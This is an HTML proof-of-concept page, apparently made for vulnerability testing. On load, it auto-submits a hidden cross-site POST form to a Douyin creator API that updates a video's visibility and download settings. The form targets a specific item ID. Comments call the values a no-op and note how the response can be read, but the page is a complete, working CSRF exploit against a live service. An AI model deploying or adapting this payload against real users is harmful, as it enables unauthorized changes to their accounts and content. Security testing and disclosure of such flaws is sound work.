<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>CSRF PoC - benign no-op probe</title></head>
<body>
<h3>CSRF PoC (no-op values, zero state change)</h3>
<pre id="out">running...</pre>
<script>
// Cross-site POST from localhost to creator.douyin.com.
// Values are identical to current state (visibility 2->2, download 1->1) => no actual change.
// Response rendered in-frame cannot be read cross-origin, but the tab navigation below makes it readable.
const form = document.createElement("form");
form.method = "POST";
form.action = "https://creator.douyin.com/web/api/media/aweme/update/?aid=1128";
form.enctype = "application/x-www-form-urlencoded";
const fields = {
  item_id: "7709330388401079909",
  download: "1",
  visibility_type: "2",
  xg_user_id: "0",
  dx_upgraded: "0"
};
for (const [k, v] of Object.entries(fields)) {
  const inp = document.createElement("input");
  inp.type = "hidden";
  inp.name = k;
  inp.value = v;
  form.appendChild(inp);
}
document.body.appendChild(form);
document.getElementById("out").textContent = "submitting form (top-level navigation)...";
form.submit();
</script>
</body>
</html>
